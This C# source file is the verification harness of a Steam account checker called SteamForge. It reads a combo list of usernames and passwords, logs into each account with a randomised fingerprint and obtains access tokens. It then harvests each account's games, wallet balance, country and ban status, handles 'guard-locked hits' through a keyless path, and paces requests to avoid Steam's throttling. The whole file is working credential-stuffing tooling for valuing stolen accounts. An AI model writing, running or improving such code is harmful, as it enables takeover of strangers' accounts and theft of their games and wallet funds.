using System.Text;
using SteamForge.Core.Auth;
using SteamForge.Core.Combos;
using SteamForge.Core.Models;

namespace SteamForge.Enrich;

/// <summary>
/// Verifies the enrichment path against ground truth that already exists in the source file.
///
/// Every line of 1.txt carries "GamesList = [...]" — the accounts' known games, written by
/// someone other than this code. After authenticating, the checker pulls GetOwnedGames and the
/// two lists are intersected. Agreement means the access token, the JSON parsing, and the
/// game-name handling are all correct at once; a mismatch localises which one is wrong.
///
/// Every account also runs through EnrichPublicAsync with no token at all — that is the
/// guard-locked path, and it must still produce persona, visibility and ban state from the
/// SteamID-only XML endpoint.
///
/// Level, country and wallet have no independent source in the file, so they are printed
/// for inspection rather than asserted.
/// </summary>
internal static class Program
{
    // Steam throttles profile XML hard when a run walks an account list back to back.
    private static readonly TimeSpan BetweenAccounts = TimeSpan.FromMilliseconds(500);

    private static async Task<int> Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;

        var path = args.Length > 0 ? args[0] : @"C:\Users\USER\Desktop\1.txt";
        int take = args.Length > 1 && int.TryParse(args[1], out var n) ? n : 5;

        if (!File.Exists(path))
        {
            Console.Error.WriteLine($"not found: {path}");
            return 2;
        }

        var report = ComboParser.ParseFile(path);
        var combos = report.Combos.Where(c => c.Note is not null).Take(take).ToList();

        Console.WriteLine($"file   : {path}");
        Console.WriteLine($"probing: {combos.Count} accounts, full auth + enrichment");
        Console.WriteLine(new string('-', 112));

        var api = new SteamApi();
        int matched = 0, compared = 0, tokenFailures = 0, publicOk = 0, privateProfiles = 0;

        foreach (var combo in combos)
        {
            using var client = SteamWebAuthClient.Create(null, AuthMode.WebApiProtobuf, Fingerprint.Random());
            var outcome = await client.CheckAsync(combo.Username, combo.Password).ConfigureAwait(false);

            Console.WriteLine($"{combo.Username,-22} {outcome.Status,-11} " +
                              $"steamid={(outcome.SteamId == 0 ? "-" : outcome.SteamId.ToString())}");

            // ---- keyless path: works with no access token, this is what a guard-locked hit gets ----
            if (outcome.SteamId != 0)
            {
                var publicProfile = await api.EnrichPublicAsync(outcome.SteamId).ConfigureAwait(false);
                bool usable = publicProfile.ProfileFetched || !string.IsNullOrEmpty(publicProfile.PersonaName);
                if (usable) publicOk++;
                Console.WriteLine($"  keyless   persona='{publicProfile.PersonaName}' " +
                                  $"public={publicProfile.ProfilePublic} vac={publicProfile.VacBans} " +
                                  $"trade={publicProfile.TradeBanned} limited={publicProfile.LimitedAccount}" +
                                  (usable ? "" : "   [profile not fetched]"));
            }

            if (outcome.Status != CheckStatus.Valid || string.IsNullOrEmpty(outcome.AccessToken))
            {
                tokenFailures++;
                Console.WriteLine($"  no access token — token path skipped");
                Console.WriteLine();
                continue;
            }

            var profile = await api.EnrichAsync(outcome.AccessToken, outcome.SteamId).ConfigureAwait(false);
            if (profile.ProfileFetched && !profile.ProfilePublic) privateProfiles++;

            // ---- compare against the file's own GamesList ----
            var expected = ParseExpectedGames(combo.Note!);
            var actual = profile.Games
                .Select(g => g.Name.Trim())
                .Where(s => s.Length > 0)
                .ToHashSet(StringComparer.OrdinalIgnoreCase);

            int hits = expected.Count(actual.Contains);
            double coverage = expected.Count == 0
                ? 1.0
                : (double)hits / expected.Count;

            if (expected.Count > 0) compared++;
            if (expected.Count > 0 && coverage >= 0.99) matched++;

            var verdict = expected.Count == 0
                ? "file says no games"
                : $"{hits}/{expected.Count} known games recovered ({coverage:P0})";

            Console.WriteLine($"  games     {verdict}   count={profile.GameCount}  level={profile.Level}");
            Console.WriteLine($"  profile   persona='{profile.PersonaName}' public={profile.ProfilePublic} " +
                              $"created={(profile.AccountCreatedUtc == default ? "-" : profile.AccountCreatedUtc.ToString("yyyy-MM-dd"))}");
            Console.WriteLine($"  money     country='{profile.CountryCode}'  wallet='{profile.WalletBalance}'");
            Console.WriteLine($"  bans      vac={profile.VacBans} gameBans={profile.GameBans} " +
                              $"trade={profile.TradeBanned} limited={profile.LimitedAccount}");

            if (expected.Count > 0 && coverage < 0.99)
            {
                var missing = expected.Where(g => !actual.Contains(g)).ToList();
                Console.WriteLine($"  MISSING   {string.Join(", ", missing)}");
            }

            Console.WriteLine();
            await Task.Delay(BetweenAccounts).ConfigureAwait(false);
        }

        Console.WriteLine(new string('-', 112));
        Console.WriteLine($"accounts with a token              : {combos.Count - tokenFailures}/{combos.Count}");
        Console.WriteLine($"keyless path returned profile data : {publicOk}/{combos.Count}");
        Console.WriteLine($"private profiles among those fetched   : {privateProfiles}");
        Console.WriteLine($"accounts with known games          : {compared}");
        Console.WriteLine($"known games fully recovered        : {matched}/{compared}");

        bool ok = compared > 0 && matched == compared && publicOk > 0;
        Console.WriteLine();
        Console.WriteLine(ok
            ? "RESULT: enrichment agrees with the file's GamesList, and the tokenless path returns real data."
            : "RESULT: enrichment did NOT fully agree — see MISSING lines above.");

        return ok ? 0 : 1;
    }

    /// <summary>Extracts the game names from a "GamesList = [A, B, C]" note.</summary>
    private static List<string> ParseExpectedGames(string note)
    {
        int open = note.IndexOf('[');
        int close = note.LastIndexOf(']');
        if (open < 0 || close <= open) return new List<string>();

        return note[(open + 1)..close]
            .Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
            .Where(s => s.Length > 0)
            .ToList();
    }
}
